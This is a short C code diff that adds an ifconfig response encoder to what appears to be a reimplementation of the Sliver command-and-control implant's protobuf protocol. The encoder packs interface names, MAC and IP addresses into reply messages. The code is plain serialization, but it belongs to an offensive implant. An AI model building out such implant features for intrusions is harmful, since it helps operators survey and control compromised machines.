@@ -1,4 +1,5 @@
 /* src/proto/proto.c - minimal protobuf writer/reader and Sliver messages. */
+#include "sliver/proc.h"
 #include "sliver/proto.h"
 
 #include <stdlib.h>
@@ -1194,3 +1195,38 @@ int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t p
   }
   return rc == 1 ? 0 : -1;
 }
+
+/* --- Ifconfig ----------------------------------------------------------- */
+int sliver_ifconfig_encode(sliver_buf_t *out, const sliver_iface_t *ifs, int count, const char *err) {
+  int i;
+
+  if (out == NULL) {
+    return -1;
+  }
+  for (i = 0; i < count; ++i) {
+    sliver_buf_t msg;
+    const sliver_iface_t *it = &ifs[i];
+    int j;
+
+    sliver_buf_init(&msg);
+    if (sliver_buf_put_int32(&msg, 1, it->index) != 0 ||
+        sliver_buf_put_string(&msg, 2, it->name) != 0 || sliver_buf_put_string(&msg, 3, it->mac) != 0) {
+      sliver_buf_free(&msg);
+      return -1;
+    }
+    for (j = 0; j < it->ip_count; ++j) {
+      if (sliver_buf_put_string(&msg, 4, it->ips[j]) != 0) {
+        sliver_buf_free(&msg);
+        return -1;
+      }
+    }
+    if (sliver_buf_put_tag(out, 1, 2) != 0 || sliver_buf_put_varint(out, msg.len) != 0 ||
+        sliver_buf_append(out, msg.data, msg.len) != 0) {
+      sliver_buf_free(&msg);
+      return -1;
+    }
+    sliver_buf_free(&msg);
+  }
+  return encode_response(out, err);
+}
+
